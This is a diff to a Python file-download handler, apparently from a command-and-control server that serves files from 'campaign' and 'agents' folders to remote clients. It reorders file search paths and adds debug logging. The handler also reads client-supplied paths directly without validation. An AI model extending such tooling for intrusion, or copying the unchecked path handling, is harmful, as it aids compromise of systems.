@@ -10,7 +10,7 @@ from handlers.base_handler import BaseHandler
 logger = logging.getLogger(__name__)
 
 class FileDownloadHandler(BaseHandler):
-    """Handler for file download requests from clients"""
+    """Handler for file download requests from clients (server sends, client downloads)"""
     
     def handle(self):
         """Process file download request from client (server sends, client downloads)"""
@@ -183,33 +183,35 @@ class FileDownloadHandler(BaseHandler):
             
             # Log the request
             self.log_message(f"File request from client {client_id or self.client_address[0]}: {file_path}")
+            self.log_message(f"Destination on client: {destination}")
+            
             if client_id:
                 self.client_manager.log_event(client_id, "File Request", f"Client requested server file: {file_path}")
             
             # Determine the file path in the campaign folders
             campaign_folder = self.get_campaign_folder()
-            downloads_folder = os.path.join(campaign_folder, "downloads")
-            uploads_folder = os.path.join(campaign_folder, "uploads")
+            uploads_folder = os.path.join(campaign_folder, "uploads")     # Primary location for files served TO clients 
+            downloads_folder = os.path.join(campaign_folder, "downloads") # Files received FROM clients
             
-            # Look for the file in several possible locations
+            # Look for the file in several possible locations with proper priority order
             possible_locations = [
                 file_path,  # Direct path
-                os.path.join(downloads_folder, file_path),  # In downloads folder
-                os.path.join(uploads_folder, file_path),  # In uploads folder
+                os.path.join(uploads_folder, file_path),  # In uploads folder - look here FIRST
+                os.path.join(campaign_folder, "agents", file_path),  # In agents folder
                 os.path.join(campaign_folder, file_path),  # In campaign folder
-                os.path.join(campaign_folder, "agents", file_path)  # In agents folder
+                os.path.join(downloads_folder, file_path),  # In downloads folder - look here LAST
             ]
             
-            # If client_id is available, also check in client-specific upload/download folders
+            # If client_id is available, also check in client-specific folders
             if client_id:
                 possible_locations.append(os.path.join(uploads_folder, client_id, file_path))
-                possible_locations.append(os.path.join(downloads_folder, client_id, file_path))
                 
                 # Try with just the filename in the client folders
                 filename = os.path.basename(file_path)
                 possible_locations.append(os.path.join(uploads_folder, client_id, filename))
-                possible_locations.append(os.path.join(downloads_folder, client_id, filename))
                 possible_locations.append(os.path.join(campaign_folder, "agents", filename))
+                # Log the locations we're checking
+            self.log_message(f"DEBUG: Looking for file {file_path} in these locations: {possible_locations}")
             
             # Try each location
             actual_path = None
@@ -232,6 +234,7 @@ class FileDownloadHandler(BaseHandler):
                 file_content = f.read()
             
             file_size = len(file_content)
+            self.log_message(f"DEBUG: Found file at {actual_path}, size: {file_size} bytes")
             file_content_base64 = base64.b64encode(file_content).decode('utf-8')
             
             # Save a copy of the sent file to the uploads folder (server perspective)
@@ -240,7 +243,7 @@ class FileDownloadHandler(BaseHandler):
             # Log the successful file transmission
             self.log_message(f"File {actual_path} ({file_size} bytes) sent to client {client_id or self.client_address[0]}")
             if client_id:
-                self.client_manager.log_event(client_id, "File Sent", f"Server file {actual_path} ({file_size} bytes) sent to client")
+                self.client_manager.log_event(client_id, "File Sent", f"Server file {actual_path} ({file_size} bytes) sent to client destination: {destination}")
             
             # Create and return the response
             return {
